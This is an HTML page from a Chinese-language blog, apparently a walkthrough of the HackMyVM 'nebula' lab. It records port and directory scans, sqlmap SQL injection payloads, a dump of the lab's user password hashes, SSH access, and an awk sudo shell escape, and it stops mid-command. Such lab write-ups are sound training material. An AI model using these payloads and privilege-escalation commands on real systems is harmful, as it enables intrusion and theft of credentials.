@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="hack-my-vm:nebula  端口探测  12345678910kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.1.26                                                                                  [23:43:47][sudo] ka">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack-my-vm:nebula">
+<meta property="og:url" content="http://example.com/2025/01/20/hack-my-vm-nebula/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="hack-my-vm:nebula  端口探测  12345678910kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.1.26                                                                                  [23:43:47][sudo] ka">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/01/20/hack-my-vm-nebula/1.png">
+<meta property="og:image" content="http://example.com/2025/01/20/hack-my-vm-nebula/2.png">
+<meta property="og:image" content="http://example.com/2025/01/20/hack-my-vm-nebula/3.png">
+<meta property="article:published_time" content="2025-01-20T15:40:34.000Z">
+<meta property="article:modified_time" content="2025-01-20T16:32:21.872Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="HACK-MY-VM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/01/20/hack-my-vm-nebula/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hack-my-vm:nebula</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/20/hack-my-vm-nebula/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/20/hack-my-vm-nebula/&text=hack-my-vm:nebula"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/20/hack-my-vm-nebula/&is_video=false&description=hack-my-vm:nebula"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm:nebula&body=Check out this article: http://example.com/2025/01/20/hack-my-vm-nebula/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/20/hack-my-vm-nebula/&name=hack-my-vm:nebula&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/20/hack-my-vm-nebula/&t=hack-my-vm:nebula"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm:nebula</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hack-my-vm:nebula
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-20T15:40:34.000Z" itemprop="datePublished">2025-01-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/HACK-MY-VM/" rel="tag">HACK-MY-VM</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1>hack-my-vm:nebula</h1>
+
+<h3>端口探测</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.1.26                                                                                  [23:43:47]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 23:44 CST</span><br><span class="line">Nmap scan report for 192.168.1.26</span><br><span class="line">Host is up (0.00098s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:FC:59:B0 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口开放不多，也没有深入扫描的必要，直接开始渗透</strong></p>
+<h3>80端口渗透</h3>
+
+<p><strong>先去主页看看，是的，啥有用的都没有发现，好吧，其实是发现了一个登录框的，我猜测是有sql注入的，不过先不尝试，直接开始目录枚举</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  gobuster  dir --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.1.26                    [23:46:04]</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.26</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/img                  (Status: 301) [Size: 310] [--&gt; http://192.168.1.26/img/]</span><br><span class="line">/login                (Status: 301) [Size: 312] [--&gt; http://192.168.1.26/login/]</span><br><span class="line">/joinus               (Status: 301) [Size: 313] [--&gt; http://192.168.1.26/joinus/]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]</span><br><span class="line">Progress: 220560 / 220561 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p><strong><a target="_blank" rel="noopener" href="http://192.168.1.26/joinus/%E9%87%8C%E9%9D%A2%E5%8F%91%E7%8E%B0%E4%BA%86%E5%A5%BD%E4%B8%9C%E8%A5%BF">http://192.168.1.26/joinus/里面发现了好东西</a></strong></p>
+<p><img src="/2025/01/20/hack-my-vm-nebula/1.png" alt="1"></p>
+<p><strong>点击之后下载了一个pdf，里面泄露了管理员的密码</strong></p>
+<p><img src="/2025/01/20/hack-my-vm-nebula/2.png" alt="2"></p>
+<p><strong>直接登录，进入后台，猜测后台提供的id查询服务存在sql注入漏洞</strong></p>
+<p><img src="/2025/01/20/hack-my-vm-nebula/3.png" alt="3"></p>
+<p><strong>直接拿url来测，猜测注入点就是id</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sqlmap -u &quot;http://192.168.1.26/login/search_central.php?id=1&quot;                                                                   [23:49:40]</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.9#stable&#125;</span><br><span class="line">|_ -| . [)]     | .&#x27;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 23:57:52 /2025-01-20/</span><br><span class="line"></span><br><span class="line">[23:57:52] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[23:57:52] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1&#x27; AND 4022=4022 AND &#x27;lVHX&#x27;=&#x27;lVHX</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&#x27; AND (SELECT 1319 FROM (SELECT(SLEEP(5)))uOrx) AND &#x27;WaFN&#x27;=&#x27;WaFN</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id=1&#x27; UNION ALL SELECT CONCAT(0x7171707671,0x436a434b6e7364716671516d4247756c4453476245614a7264596974696d567758686c586c505345,0x71626b6b71),NULL,NULL-- -</span><br><span class="line">---</span><br><span class="line">[23:57:52] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)</span><br><span class="line">web application technology: Apache 2.4.41</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">[23:57:52] [INFO] fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/192.168.1.26&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 23:57:52 /2025-01-20/</span><br></pre></td></tr></table></figure>
+
+<p><strong>直接查询数据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[23:58:38] [INFO] fetching database names</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] nebuladb</span><br><span class="line"></span><br><span class="line">//库名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[23:58:51] [INFO] fetching tables for database: &#x27;nebuladb&#x27;</span><br><span class="line">Database: nebuladb</span><br><span class="line">[3 tables]</span><br><span class="line">+----------+</span><br><span class="line">| central  |</span><br><span class="line">| centrals |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">//表名</span><br><span class="line"></span><br><span class="line">Database: nebuladb                                                                                                                                         </span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+----------+----------------------------------------------+-------------+</span><br><span class="line">| id | is_admin | password                                     | username    |</span><br><span class="line">+----+----------+----------------------------------------------+-------------+</span><br><span class="line">| 1  | 1        | d46df8e6a5627debf930f7b5c8f3b083             | admin       |</span><br><span class="line">| 2  | 0        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |</span><br><span class="line">| 3  | 0        | 5f823f1ac7c9767c8d1efbf44158e0ea             | Frederick   |</span><br><span class="line">| 3  | 0        | 4c6dda8a9d149332541e577b53e2a3ea             | Samuel      |</span><br><span class="line">| 5  | 0        | 41ae0e6fbe90c08a63217fc964b12903             | Mary        |</span><br><span class="line">| 6  | 0        | 5d8cdc88039d5fc021880f9af4f7c5c3             | hecolivares |</span><br><span class="line">| 7  | 1        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |</span><br><span class="line">+----+----------+----------------------------------------------+-------------+</span><br><span class="line"></span><br><span class="line">//数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>mysql帮助我们破解了hash，我们可以看到，还有一个管理员，猜测这个就是ssh可以登录的用户</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ssh pmccentral@192.168.1.26                                                                                                      [0:02:44]</span><br><span class="line">pmccentral@192.168.1.26&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon 20 Jan 2025 04:03:14 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:             0.45</span><br><span class="line">  Usage of /:              39.6% of 9.75GB</span><br><span class="line">  Memory usage:            16%</span><br><span class="line">  Swap usage:              0%</span><br><span class="line">  Processes:               126</span><br><span class="line">  Users logged in:         0</span><br><span class="line">  IPv4 address for enp0s3: 192.168.1.26</span><br><span class="line">  IPv6 address for enp0s3: 2409:8a70:2a31:d8b0:a00:27ff:fefc:59b0</span><br><span class="line"></span><br><span class="line"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s</span><br><span class="line">   just raised the bar for easy, resilient and secure K8s cluster deployment.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/engage/secure-kubernetes-at-the-edge</span><br><span class="line"></span><br><span class="line"> * Introducing Expanded Security Maintenance for Applications.</span><br><span class="line">   Receive updates to over 25,000 software packages with your</span><br><span class="line">   Ubuntu Pro subscription. Free for personal use.</span><br><span class="line"></span><br><span class="line">     https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="line"></span><br><span class="line">48 updates can be applied immediately.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line">New release &#x27;22.04.5 LTS&#x27; available.</span><br><span class="line">Run &#x27;do-release-upgrade&#x27; to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Mon Jan 20 16:02:14 2025 from 192.168.1.4</span><br><span class="line">pmccentral@laboratoryuser:~$ whoami</span><br><span class="line">pmccentral</span><br></pre></td></tr></table></figure>
+
+<p><strong>拿到一个用户，但是很遗憾，没有flag</strong></p>
+<h3>提权</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pmccentral@laboratoryuser:~$ sudo -l</span><br><span class="line">[sudo] password for pmccentral: </span><br><span class="line">Matching Defaults entries for pmccentral on laboratoryuser:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User pmccentral may run the following commands on laboratoryuser:</span><br><span class="line">    (laboratoryadmin) /usr/bin/awk</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以看到，我们可以使用laboratoryadmin用户无密码运行awk，我们去查找awk有关sudo的提权</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sudo</span><br><span class="line"></span><br><span class="line">If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</span><br><span class="line"></span><br><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面是查询到的awk的sudo提权命令，不理解可以让gpt解释，我们直接使用提权</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pmccentral@laboratoryuser:~$ sudo -u laboratoryadmin  awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">laboratoryadmin</span><br></pre></td></tr></table></figure>
+
+<p><strong>拿到该用户的权限，但是其shell的交互性很差，我们发现该机器存在python3，我们使用python3启动一个更加稳定的终端</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.8.10 (default, Nov  7 2024, 13:10:47) </span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; exit()</span><br><span class="line">$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">laboratoryadmin@laboratoryuser:/home/pmccentral$ whoami</span><br><span class="line">laboratoryadmin</span><br><span class="line">laboratoryadmin@laboratoryuser:/home/pmccentral$ </span><br></pre></td></tr></table></figure>
+
+<p><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><strong>这是python3启动稳定终端[强交互性]的命令</strong></p>
+<p><strong>直接跑linpeas看看机器上的敏感文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 87K Feb  6  2024 /snap/core20/2434/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 55K Apr  9  2024 /snap/core20/2434/usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8</span><br><span class="line">-rwsr-xr-x 1 root root 44K Feb  6  2024 /snap/core20/2434/usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br><span class="line">-rwsr-xr-x 1 root root 67K Feb  6  2024 /snap/core20/2434/usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)</span><br><span class="line">-rwsr-xr-x 1 root root 67K Apr  9  2024 /snap/core20/2434/usr/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/2434/usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable</span><br><span class="line">-rwsr-xr-x 1 root root 39K Apr  9  2024 /snap/core20/2434/usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 467K Jan  2  2024 /snap/core20/2434/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 129K Sep 15  2023 /snap/snapd/20290/usr/lib/snapd/snap-confine  ---&gt;  Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)</span><br><span class="line">-rwsr-xr-x 1 root root 177K Dec  4 09:13 /snap/snapd/23545/usr/lib/snapd/snap-confine  ---&gt;  Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)</span><br><span class="line">-rwsr-xr-x 1 root root 17K Dec 17  2023 /home/laboratoryadmin/autoScripts/PMCEmployees (Unknown SUID binary!)</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面是linpeas脚本列举的SUID文件的一部分，我们注意最后一个，在这个laboratoryadmin用户目录下面有一个文件，我们去看看</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">laboratoryadmin@laboratoryuser:~$ file /home/laboratoryadmin/autoScripts/PMCEmployees</span><br><span class="line">/home/laboratoryadmin/autoScripts/PMCEmployees: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2e8e1b3a3f1bba666df17c97871f88b0377343fb, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">laboratoryadmin@laboratoryuser:~$ strings 